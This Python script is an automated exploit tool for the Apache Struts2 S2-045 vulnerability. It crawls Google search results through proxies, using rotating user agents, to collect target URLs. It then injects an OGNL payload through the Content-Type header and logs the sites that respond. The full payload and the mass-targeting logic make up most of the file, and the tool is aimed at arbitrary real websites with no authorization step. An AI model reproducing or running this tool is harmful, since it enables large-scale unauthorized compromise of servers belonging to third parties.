#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Struts2-S2-045 auto exploit throw google search results crawler
#

import sys, os
import Queue
import threading
import StringIO
import ConfigParser
import socket, socks
import time, signal, gzip
import re, random, types
from bs4 import BeautifulSoup
from atexit import register


cp = ConfigParser.SafeConfigParser()
cp.read('crawler.conf')
if cp.has_option('http', 'http_addr') and cp.has_option('http', 'http_port'):
    http_proxy = {
        'host': cp.get('socks5', 'proxy_addr'),
        'port': int(cp.get('socks5', 'proxy_port'))
    }
elif cp.has_option('socks', 'socks_addr') and cp.has_option('socks', 'socks_port'):
    proxy_addr = cp.get('socks5', 'proxy_addr')
    proxy_port = int(cp.get('socks5', 'proxy_port'))
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_addr, proxy_port)
    socket.socket = socks.socksocket
import urllib2


base_url = cp.get('crawler', 'base_url')
results_per_page = 10
user_agents = []
url_set = set()
url_queue = Queue.Queue()
vuln_queue = Queue.Queue()
lock = threading.Lock()


class SubThread(threading.Thread):

    def __init__(self, func, args):
        super(SubThread, self).__init__(name=func.__name__)
        self.func = func
        self.args = args

    def run(self):
        self.func(*self.args)


class GoogleAPI:

    """
    google search results crawler
    Create by Meibenjin
    Last updated: 2017-03-10
    """

    def __init__(self):
        timeout = 40
        socket.setdefaulttimeout(timeout)

    def random_sleep(self):
        # sleeptime = random.randint(60, 120)
        sleeptime = random.randint(10, 30)
        time.sleep(sleeptime)

    # extract a url from a link
    def extract_url(self, href):
        url = ''
        pattern = re.compile(
            r'(?:http[s]?)?.*?(http[s]?://[^&]+)&', re.U | re.M)
        url_match = pattern.search(href)
        if url_match and url_match.lastindex > 0:
            url = url_match.group(1)
        return url.split('%3F', 1)[0]

    # extract serach results list from downloaded html file
    def extract_search_results(self, html):
        soup = BeautifulSoup(html, "html.parser")
        div = soup.find('div', id='search')
        if type(div) != types.NoneType:
            lis = div.findAll('div', {'class': 'g'})
            if len(lis) > 0:
                for li in lis:
                    h3 = li.find('h3', {'class': 'r'})
                    if type(h3) == types.NoneType:
                        continue
                    # extract url from h3 object
                    link = h3.find('a')
                    if type(link) == types.NoneType:
                        continue
                    url = link['href']
                    url = self.extract_url(url)
                    if cmp(url, '') == 0:
                        continue
                    if url in url_set:
                        continue
                    with lock:
                        print '\033[0;32m[*] [URL]\033[0m', url
                    url_queue.put(url)
                    url_set.add(url)

    # search web
    def search(self, query, lang='en', num=results_per_page):
        if http_proxy:
            proxy_support = urllib2.ProxyHandler({'http': 'http://%(host)s:%(port)d' % http_proxy})
            opener = urllib2.build_opener(proxy_support)
            urllib2.install_opener(opener)
        query = urllib2.quote(query)
        if num % results_per_page == 0:
            pages = num / results_per_page
        else:
            pages = num / results_per_page + 1
        for p in xrange(0, pages):
            start = p * results_per_page
            url = '%s/search?hl=%s&num=%d&start=%s&q=%s' % (base_url, lang, results_per_page, start, query)
            retry = 3
            while retry > 0:
                try:
                    request = urllib2.Request(url)
                    length = len(user_agents)
                    index = random.randint(0, length - 1)
                    user_agent = user_agents[index]
                    request.add_header('User-agent', user_agent)
                    request.add_header('connection', 'keep-alive')
                    request.add_header('Accept-Encoding', 'gzip')
                    request.add_header('referer', base_url)
                    response = urllib2.urlopen(request)
                    html = response.read()
                    if response.headers.get('content-encoding', None) == 'gzip':
                        html = gzip.GzipFile(fileobj=StringIO.StringIO(html)).read()
                    self.extract_search_results(html)
                    break
                except urllib2.URLError, e:
                    with lock:
                        print '\033[0;31m[!] [SEARCH_ERROR]\033[0m', e
                    self.random_sleep()
                    retry = retry - 1
                    continue
                except Exception, e:
                    with lock:
                        print '\033[0;31m[!] [SEARCH_ERROR]\033[0m', e
                    retry = retry - 1
                    self.random_sleep()
                    continue


def load_user_agent():
    with open('./user_agents.txt', 'r') as fp:
        for line in fp.readlines():
            line = line.strip('\n')
            user_agents.append(line)


def crawler():
    with lock:
        print '\033[0;32m[*] crawler starting\033[0m'
    # Load use agent string from file
    load_user_agent()

    # Create a GoogleAPI instance
    api = GoogleAPI()

    # set expect search results to be crawled
    expect_num = 100
    # if no parameters, read query keywords from file
    if len(sys.argv) < 2:
        keyword = cp.get('crawler', 'keyword')
        api.search(keyword, num=expect_num)
    else:
        keyword = sys.argv[1]
        api.search(keyword, num=expect_num)


def poccheck(timeout):
    with lock:
        print '\033[0;32m[*] poc starting\033[0m'
    poc = "%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    poc += "(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))."
    poc += "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('fuck')).(#o.close())}"
    S2_045 = {
        "poc": poc,
        "key": "fuck"
    }
    while True:
        url = url_queue.get()
        with lock:
            print '\033[0;32m[*] testing %s\033[0m' % url
        request = urllib2.Request(url)
        request.add_header("Content-Type", S2_045["poc"])
        request.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0")
        try:
            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
        except Exception, e:
            with lock:
                print ''
                print '\033[0;31m[!] [POC_ERROR]\033[0m', e
                print ''
        else:
            if S2_045['key'] in res_html:
                with lock:
                    print ''
                    print '\033[1;32m[*] [VULNERABLE]\033[0m', url
                    print ''
                    vuln_queue.put(url)
                    with open('./vulnerable.txt', 'w') as vulnerable:
                        vulnerable.write(url+'\n')


def banner():
    print " ____ ____        ___  _  _  ____  "
    print "/ ___|___ \      / _ \| || || ___| "
    print "\___ \ __) |____| | | | || ||___ \ "
    print " ___) / __/_____| |_| |__   _|__) |"
    print "|____/_____|     \___/   |_||____/ "
    print "                                   "
    print "    _         _        ____                 "
    print "   / \  _   _| |_ ___ |  _ \__      ___ __  "
    print "  / _ \| | | | __/ _ \| |_) \ \ /\ / / '_ \ "
    print " / ___ \ |_| | || (_) |  __/ \ V  V /| | | |"
    print "/_/   \_\__,_|\__\___/|_|     \_/\_/ |_| |_|"
    print "                                            "


@register
def atexit():
    if vuln_queue.empty():
        print '\033[1;33m\r[*] no vulnerable url have found\033[0m'
    print ''
    print '[*] shutting down at', time.strftime("%H:%M:%S")
    print ''


def main():
    banner()
    if proxy_addr and proxy_port:
        print '[*] [PROXY] %s:%d' % (proxy_addr, proxy_port)
    print ''
    print '[*] starting at', time.strftime("%H:%M:%S")
    print ''
    try:
        poc_thread = SubThread(poccheck, (10, ))
        poc_thread.daemon = True
        poc_thread.start()
        crawler()
    except KeyboardInterrupt:
        sys.exit()
    

if __name__ == '__main__':
    main()
